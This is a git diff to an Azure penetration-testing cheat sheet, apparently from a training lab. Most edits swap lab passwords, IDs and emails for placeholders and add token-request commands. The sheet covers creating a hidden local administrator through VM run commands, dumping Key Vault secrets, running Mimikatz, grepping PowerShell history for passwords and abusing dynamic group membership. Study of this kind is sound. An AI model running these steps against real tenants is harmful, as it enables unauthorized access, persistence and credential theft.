@@ -124,7 +124,7 @@ Publish-AzAutomationRunbook -RunbookName <NAME FOR RUNBOOK> -AutomationAccountNa
 
 #### Start the runbook
 ```
-Start-AzAutomationRunbook -RunbookName <NAME OF RUNBOOK> -RunOn <WORK GROUP> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
+Start-AzAutomationRunbook -RunbookName <NAME OF RUNBOOK> -RunOn <WORKERGROUP NAME> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
 ```
 
 ## Command execution on a VM
@@ -163,20 +163,20 @@ Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
 
 #### Run a command on the VM
 ```
-Invoke-AzVMRunCommand -VMName <VM NAME> -ResourceGroupName <RESOURCE GROUP NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
+Invoke-AzVMRunCommand -VMName <VM NAME> -ResourceGroupName <NAME> -CommandId 'RunPowerShellScript' -ScriptPath '<PATH TO .ps1 FILE>' -Verbose
 ```
 
 #### Contents of adduser.ps1
 ```
-$passwd = ConvertTo-SecureString "Stud38Password@123" -AsPlainText -Force
-New-LocalUser -Name student38 -Password $passwd
+$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
+New-LocalUser -Name <USER> -Password $passwd
 Add-LocalGroupMember -Group Administrators -Member student38
 ```
 
 #### Access the VM
 ```
-$password = ConvertTo-SecureString 'Stud38Password@123' -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential('student38', $Password)
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('<USER>', $Password)
 $sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
 Enter-PSSession $sess
 ```
@@ -204,8 +204,16 @@ cat C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Cons
 - Always use Disconnect-AzAccount!!
 
 ### Requesting tokens once logged in
+#### AZ powershell
+- Supported tokens - AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, OperationalInsights, ResourceManager, Synapse
+```
+Get-AzAccessToken -ResourceTypeName AadGraph
 ```
 
+#### Azure CLI
+- Supported tokens - aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
+```
+az account get-access-token --resource-type ms-graph 
 ```
 
 ### Keyvault
@@ -219,7 +227,7 @@ curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01
 $accesstoken = ''
 $keyvaulttoken = ``
 
-Connect-AzAccount -AccessToken $accesstoken -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
+Connect-AzAccount -AccessToken $accesstoken -AccountId <ID> -KeyVaultAccessToken $keyvaulttoken
 ```
 
 #### List all keyvaults
@@ -245,7 +253,7 @@ Get-AzKeyVaultSecret -VaultName <VAULT NAME> -Name <NAME> -AsPlainText
 #### Connect with the credentials found and enumerate further!
 ```
 $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password)
+$creds = New-Object System.Management.Automation.PSCredential('<USERNAME>', $password)
 
 Connect-AzAccount -Credential $creds
 ```
@@ -262,7 +270,9 @@ Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 
 ### Powershell History
 ```
-type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Get-Childitem -Path C:\Users\ -Force -Include ConsoleHost_history -Recurse -ErrorAction SilentlyContinue
+cat <FILE> | select-string password
+cat <FILE> | select-string secure
 ```
 
 ### Transcript
@@ -368,7 +378,7 @@ Get-AzureADMSGroup | Where-Object -Property GroupTypes -Match 'DynamicMembership
 ```
 
 ```
-Set-AzureADUser -ObjectId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com -Verbose
+Set-AzureADUser -ObjectId <ID> -OtherMails <EMAIL> -Verbose
 ```
 - Check if the user is added to the dynamic group (Might take a bit)
 
